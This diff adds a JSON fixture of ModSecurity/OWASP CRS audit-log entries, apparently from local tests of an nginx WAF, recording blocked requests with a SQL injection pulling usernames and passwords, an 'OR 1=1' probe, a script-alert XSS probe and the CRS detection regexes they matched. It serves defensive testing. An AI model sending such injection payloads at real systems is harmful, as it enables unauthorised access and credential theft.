@@ -1,0 +1,980 @@
+[
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34696,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414775.156073",
+      "is_interrupted": true,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "modsec-capture/1.0"
+        }
+      },
+      "response": {
+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>403 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <!-- Google Fonts -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Gowun+Batang&family=Inter&family=Noto+Sans+KR&display=swap\" rel=\"stylesheet\">\n    <!-- Pretendard from CDN -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css\">\n    <style>\n        :root {\n            --font-system: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            --font-gowun-batang: 'Gowun Batang', serif;\n            --font-noto-sans-kr: 'Noto Sans KR', sans-serif;\n            --font-pretendard: 'Pretendard', sans-serif;\n            --font-inter: 'Inter', sans-serif;\n            --current-font: var(--font-system);\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: var(--current-font);\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n\n        body[data-font=\"gowun-batang\"] { --current-font: var(--font-gowun-batang); }\n        body[data-font=\"noto-sans-kr\"] { --current-font: var(--font-noto-sans-kr); }\n        body[data-font=\"pretendard\"] { --current-font: var(--font-pretendard); }\n        body[data-font=\"inter\"] { --current-font: var(--font-inter); }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .shield {\n            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;\n        }\n        .shield svg {\n            width: 100%; height: 100%;\n            filter: drop-shadow(0 10px 30px rgba(239, 68, 68, 0.3));\n        }\n        .shield-icon { fill: #ef4444; animation: pulse 2s infinite; }\n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.7; }\n        }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #ef4444 0%, #f97316 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            background-clip: text; margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .security-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 50px;\n            color: #ef4444; font-size: 14px; font-weight: 500;\n        }\n        .security-badge svg { width: 18px; height: 18px; }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title {\n            font-size: 14px; font-weight: 600; color: #808080;\n            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;\n        }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .back-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;\n            cursor: pointer; border: none;\n        }\n        .back-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);\n        }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"shield\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <path class=\"shield-icon\" d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.62z\"/>\n                <path fill=\"#fff\" opacity=\"0.3\" d=\"M12 12.99V21c-3.72-1.15-6.47-4.82-7-8.94h7z\"/>\n                <line x1=\"8\" y1=\"10\" x2=\"16\" y2=\"10\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n                <line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"14\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n            </svg>\n        </div>\n\n        <div class=\"error-code\">403</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">접근이 차단되었습니다</div>\n        <div class=\"error-title\" data-lang=\"en\">Access Blocked</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            보안 정책에 의해 요청이 차단되었습니다.<br>\n            이 보안 조치는 잠재적으로 유해한 요청으로부터 시스템을 보호합니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Your request has been blocked by the security policy.<br>\n            This security measure protects the system from potentially harmful requests.\n        </div>\n\n        <div class=\"security-badge\">\n            <svg viewBox=\"0 0 24 24\" fill=\"currentColor\">\n                <path d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z\"/>\n            </svg>\n            <span data-lang=\"ko\">Nginx Proxy Guard 보안 보호</span>\n            <span data-lang=\"en\">Protected by Nginx Proxy Guard</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">왜 차단되었나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">Why was I blocked?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                요청에 알려진 공격 패턴(SQL 인젝션, XSS, 경로 탐색 등)과 일치하는<br>\n                내용이 포함되어 있습니다. 오류라고 생각되시면 관리자에게 문의해 주세요.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                The request contained patterns that match known attack signatures<br>\n                (SQL injection, XSS, path traversal, etc.). Contact the administrator if you believe this is a mistake.\n            </div>\n        </div>\n\n        <button class=\"back-btn\" onclick=\"history.back()\">\n            <span data-lang=\"ko\">뒤로 가기</span>\n            <span data-lang=\"en\">Go Back</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load global UI settings (font + admin-configured default error page language)\n        async function loadUISettings() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (res.ok) {\n                    const data = await res.json();\n                    if (data.font_family && data.font_family !== 'system') {\n                        document.body.setAttribute('data-font', data.font_family);\n                    }\n                    // Admin default only applies when the visitor has no saved preference.\n                    // 'auto' (or missing) means follow browser language.\n                    if (savedLang !== 'ko' && savedLang !== 'en') {\n                        var adminDefault = data.error_page_language;\n                        if (adminDefault === 'ko' || adminDefault === 'en') {\n                            applyLang(adminDefault);\n                        }\n                        // else 'auto' → keep the browser-detected lang already applied.\n                    }\n                    return;\n                }\n            } catch (e) {\n                // API unavailable — fall back to saved font preference if any\n                var savedFont = localStorage.getItem('npg_font_family');\n                if (savedFont && savedFont !== 'system') {\n                    document.body.setAttribute('data-font', savedFont);\n                }\n            }\n        }\n        loadUISettings();\n    </script>\n</body>\n</html>\n",
+        "http_code": 403,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2a79\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "10873",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": [
+        {
+          "message": "SQL Injection Attack Detected via libinjection",
+          "details": {
+            "match": "detected SQLi using libinjection.",
+            "reference": "v9,46",
+            "ruleId": "942100",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+            "lineNumber": "46",
+            "data": "Matched Data: sUEnk found within ARGS:id: 1' UNION SELECT username,password FROM users--",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-sqli",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-SQLI",
+              "capec/1000/152/248/66"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Detects MSSQL code execution and information gathering attempts",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)[\\\"'`](?:[\\s\\x0b]*![\\s\\x0b]*[\\\"'0-9A-Z_-z]|;?[\\s\\x0b]*(?:having|select|union\\b[\\s\\x0b]*(?:all|(?:distin|sele)ct))\\b[\\s\\x0b]*[^\\s\\x0b])|\\b(?:(?:(?:c(?:onnection_id|urrent_user)|database|schema|user (311 characters omitted)' against variable `ARGS:id' (Value: `1' UNION SELECT username,password FROM users--' )",
+            "reference": "o1,16v9,46t:urlDecodeUni,t:removeCommentsChar",
+            "ruleId": "942190",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+            "lineNumber": "206",
+            "data": "Matched Data: ' UNION SELECT u found within ARGS:id: 1' UNION SELECT username,password FROM users",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-sqli",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-SQLI",
+              "capec/1000/152/248/66"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Looking for basic sql injection. Common attack string for mysql, oracle and others",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)union.*?select.*?from' against variable `ARGS:id' (Value: `1' UNION SELECT username,password FROM users--' )",
+            "reference": "o3,35v9,46t:urlDecodeUni",
+            "ruleId": "942270",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+            "lineNumber": "334",
+            "data": "Matched Data: UNION SELECT username,password FROM found within ARGS:id: 1' UNION SELECT username,password FROM users--",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-sqli",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-SQLI",
+              "capec/1000/152/248/66"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Detects concatenated basic SQL injection and SQLLFI attempts",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)\\b(?:(?:alter|(?:(?:cre|trunc|upd)at|renam)e|de(?:lete|sc)|(?:inser|selec)t|load)[\\s\\x0b]+(?:char|group_concat|load_file)\\b[\\s\\x0b]*\\(?|end[\\s\\x0b]*?\\);)|[\\s\\x0b\\(]load_file[\\s\\x0b]*?\\(|[\\\"'`][\\s\\ (1249 characters omitted)' against variable `ARGS:id' (Value: `1' UNION SELECT username,password FROM users--' )",
+            "reference": "o0,15v9,46t:urlDecodeUni",
+            "ruleId": "942360",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+            "lineNumber": "480",
+            "data": "Matched Data: 1' UNION SELECT found within ARGS:id: 1' UNION SELECT username,password FROM users--",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-sqli",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-SQLI",
+              "capec/1000/152/248/66"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Inbound Anomaly Score Exceeded (Total Score: 20)",
+          "details": {
+            "match": "Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `20' )",
+            "reference": "",
+            "ruleId": "949110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf",
+            "lineNumber": "222",
+            "data": "",
+            "severity": "0",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "anomaly-evaluation",
+              "OWASP_CRS"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34706,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414717.996313",
+      "is_interrupted": true,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/?q=1%20OR%201=1",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "modsec-capture/1.0"
+        }
+      },
+      "response": {
+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>403 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <!-- Google Fonts -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Gowun+Batang&family=Inter&family=Noto+Sans+KR&display=swap\" rel=\"stylesheet\">\n    <!-- Pretendard from CDN -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css\">\n    <style>\n        :root {\n            --font-system: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            --font-gowun-batang: 'Gowun Batang', serif;\n            --font-noto-sans-kr: 'Noto Sans KR', sans-serif;\n            --font-pretendard: 'Pretendard', sans-serif;\n            --font-inter: 'Inter', sans-serif;\n            --current-font: var(--font-system);\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: var(--current-font);\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n\n        body[data-font=\"gowun-batang\"] { --current-font: var(--font-gowun-batang); }\n        body[data-font=\"noto-sans-kr\"] { --current-font: var(--font-noto-sans-kr); }\n        body[data-font=\"pretendard\"] { --current-font: var(--font-pretendard); }\n        body[data-font=\"inter\"] { --current-font: var(--font-inter); }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .shield {\n            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;\n        }\n        .shield svg {\n            width: 100%; height: 100%;\n            filter: drop-shadow(0 10px 30px rgba(239, 68, 68, 0.3));\n        }\n        .shield-icon { fill: #ef4444; animation: pulse 2s infinite; }\n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.7; }\n        }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #ef4444 0%, #f97316 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            background-clip: text; margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .security-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 50px;\n            color: #ef4444; font-size: 14px; font-weight: 500;\n        }\n        .security-badge svg { width: 18px; height: 18px; }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title {\n            font-size: 14px; font-weight: 600; color: #808080;\n            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;\n        }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .back-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;\n            cursor: pointer; border: none;\n        }\n        .back-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);\n        }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"shield\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <path class=\"shield-icon\" d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.62z\"/>\n                <path fill=\"#fff\" opacity=\"0.3\" d=\"M12 12.99V21c-3.72-1.15-6.47-4.82-7-8.94h7z\"/>\n                <line x1=\"8\" y1=\"10\" x2=\"16\" y2=\"10\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n                <line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"14\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n            </svg>\n        </div>\n\n        <div class=\"error-code\">403</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">접근이 차단되었습니다</div>\n        <div class=\"error-title\" data-lang=\"en\">Access Blocked</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            보안 정책에 의해 요청이 차단되었습니다.<br>\n            이 보안 조치는 잠재적으로 유해한 요청으로부터 시스템을 보호합니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Your request has been blocked by the security policy.<br>\n            This security measure protects the system from potentially harmful requests.\n        </div>\n\n        <div class=\"security-badge\">\n            <svg viewBox=\"0 0 24 24\" fill=\"currentColor\">\n                <path d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z\"/>\n            </svg>\n            <span data-lang=\"ko\">Nginx Proxy Guard 보안 보호</span>\n            <span data-lang=\"en\">Protected by Nginx Proxy Guard</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">왜 차단되었나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">Why was I blocked?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                요청에 알려진 공격 패턴(SQL 인젝션, XSS, 경로 탐색 등)과 일치하는<br>\n                내용이 포함되어 있습니다. 오류라고 생각되시면 관리자에게 문의해 주세요.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                The request contained patterns that match known attack signatures<br>\n                (SQL injection, XSS, path traversal, etc.). Contact the administrator if you believe this is a mistake.\n            </div>\n        </div>\n\n        <button class=\"back-btn\" onclick=\"history.back()\">\n            <span data-lang=\"ko\">뒤로 가기</span>\n            <span data-lang=\"en\">Go Back</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load global UI settings (font + admin-configured default error page language)\n        async function loadUISettings() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (res.ok) {\n                    const data = await res.json();\n                    if (data.font_family && data.font_family !== 'system') {\n                        document.body.setAttribute('data-font', data.font_family);\n                    }\n                    // Admin default only applies when the visitor has no saved preference.\n                    // 'auto' (or missing) means follow browser language.\n                    if (savedLang !== 'ko' && savedLang !== 'en') {\n                        var adminDefault = data.error_page_language;\n                        if (adminDefault === 'ko' || adminDefault === 'en') {\n                            applyLang(adminDefault);\n                        }\n                        // else 'auto' → keep the browser-detected lang already applied.\n                    }\n                    return;\n                }\n            } catch (e) {\n                // API unavailable — fall back to saved font preference if any\n                var savedFont = localStorage.getItem('npg_font_family');\n                if (savedFont && savedFont !== 'system') {\n                    document.body.setAttribute('data-font', savedFont);\n                }\n            }\n        }\n        loadUISettings();\n    </script>\n</body>\n</html>\n",
+        "http_code": 403,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2a79\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "10873",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": [
+        {
+          "message": "SQL Injection Attack Detected via libinjection",
+          "details": {
+            "match": "detected SQLi using libinjection.",
+            "reference": "v8,8",
+            "ruleId": "942100",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+            "lineNumber": "46",
+            "data": "Matched Data: 1&1 found within ARGS:q: 1 OR 1=1",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-sqli",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-SQLI",
+              "capec/1000/152/248/66"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Inbound Anomaly Score Exceeded (Total Score: 5)",
+          "details": {
+            "match": "Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `5' )",
+            "reference": "",
+            "ruleId": "949110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf",
+            "lineNumber": "222",
+            "data": "",
+            "severity": "0",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "anomaly-evaluation",
+              "OWASP_CRS"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34720,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414751.906704",
+      "is_interrupted": true,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/?msg=%3Cscript%3Ealert(1)%3C/script%3E",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "modsec-capture/1.0"
+        }
+      },
+      "response": {
